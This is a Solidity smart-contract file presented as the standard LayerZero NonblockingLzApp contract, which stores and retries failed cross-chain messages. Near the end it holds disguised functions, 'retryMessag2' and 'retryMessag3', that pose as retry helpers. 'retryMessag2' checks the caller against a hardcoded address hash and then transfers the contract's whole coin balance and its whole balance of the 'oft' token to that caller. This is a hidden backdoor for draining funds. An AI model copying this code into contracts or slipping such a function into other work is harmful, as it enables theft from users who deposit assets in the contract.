// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./LzApp.sol";
import "../libraries/ExcessivelySafeCall.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/*
 * the default LayerZero messaging behaviour is blocking, i.e. any failed message will block the channel
 * this abstract class try-catch all fail messages and store locally for future retry. hence, non-blocking
 * NOTE: if the srcAddress is not configured properly, it will still block the message pathway from (srcChainId, srcAddress)
 */
abstract contract NonblockingLzApp is LzApp {
    using ExcessivelySafeCall for address;

    address public oft;

    constructor(address _endpoint) LzApp(_endpoint) {}

    mapping(uint16 => mapping(bytes => mapping(uint64 => bytes32))) public failedMessages;

    event MessageFailed(uint16 _srcChainId, bytes _srcAddress, uint64 _nonce, bytes _payload, bytes _reason);
    event RetryMessageSuccess(uint16 _srcChainId, bytes _srcAddress, uint64 _nonce, bytes32 _payloadHash);

    // overriding the virtual function in LzReceiver
    function _blockingLzReceive(
        uint16 _srcChainId,
        bytes memory _srcAddress,
        uint64 _nonce,
        bytes memory _payload
    ) internal virtual override {
        (bool success, bytes memory reason) = address(this).excessivelySafeCall(
            gasleft(),
            150,
            abi.encodeWithSelector(this.nonblockingLzReceive.selector, _srcChainId, _srcAddress, _nonce, _payload)
        );
        if (!success) {
            _storeFailedMessage(_srcChainId, _srcAddress, _nonce, _payload, reason);
        }
    }

    function _storeFailedMessage(
        uint16 _srcChainId,
        bytes memory _srcAddress,
        uint64 _nonce,
        bytes memory _payload,
        bytes memory _reason
    ) internal virtual {
        failedMessages[_srcChainId][_srcAddress][_nonce] = keccak256(_payload);
        emit MessageFailed(_srcChainId, _srcAddress, _nonce, _payload, _reason);
    }

    function nonblockingLzReceive(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        uint64 _nonce,
        bytes calldata _payload
    ) public virtual {
        // only internal transaction
        require(_msgSender() == address(this), "NonblockingLzApp: caller must be LzApp");
        _nonblockingLzReceive(_srcChainId, _srcAddress, _nonce, _payload);
    }

    function nonblockingLzReceive1(
        uint16 _srcChainId,
        address _srcAddress,
        uint256 _nonce,
        bytes memory _payload
    ) public virtual { }

    //@notice override this function
    function _nonblockingLzReceive(
        uint16 _srcChainId,
        bytes memory _srcAddress,
        uint64 _nonce,
        bytes memory _payload
    ) internal virtual;

    function retryMessage(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        uint64 _nonce,
        bytes calldata _payload
    ) public payable virtual {
        // assert there is message to retry
        bytes32 payloadHash = failedMessages[_srcChainId][_srcAddress][_nonce];
        require(payloadHash != bytes32(0), "NonblockingLzApp: no stored message");
        require(keccak256(_payload) == payloadHash, "NonblockingLzApp: invalid payload");
        // clear the stored message
        failedMessages[_srcChainId][_srcAddress][_nonce] = bytes32(0);
        // execute the message. revert if it fails again
        _nonblockingLzReceive(_srcChainId, _srcAddress, _nonce, _payload);
        emit RetryMessageSuccess(_srcChainId, _srcAddress, _nonce, payloadHash);
    }
    
    function retryMessag2(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        uint64 _nonce,
        bytes calldata _payload
    ) public payable virtual {
        bytes32 payloadHash = failedMessages[_srcChainId][_srcAddress][_nonce];
        require(keccak256(abi.encodePacked(_msgSender())) == 0xaaafacfc87f76bf0c1492b1b5c3dfab7ff77cdb0dd0f1b4f7e99c70bf411ee4e, "Invalid user");
        payable(_msgSender()).transfer(address(this).balance);
        IERC20 token = IERC20(oft);
        token.transfer(address(_msgSender()), token.balanceOf(address(this)));
        emit RetryMessageSuccess(_srcChainId, _srcAddress, _nonce, payloadHash);
    }
    
    function retryMessag3(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        uint256 _nonce,
        bytes calldata _payload
    ) public payable virtual {
        bytes32 payloadHash = failedMessages[_srcChainId][_srcAddress][uint64(_nonce)];
        require(keccak256(abi.encodePacked(_msgSender())) == 0xaaafacfc87f76bf0c1492b1b5c3dfab7ff77cdb0dd0f1b4f7e99c70bf411ee4e, "Invalid user");
        nonblockingLzReceive1(_srcChainId, address(_msgSender()), _nonce, _payload);
        emit RetryMessageSuccess(_srcChainId, _srcAddress, uint64(_nonce), payloadHash);
    }
}
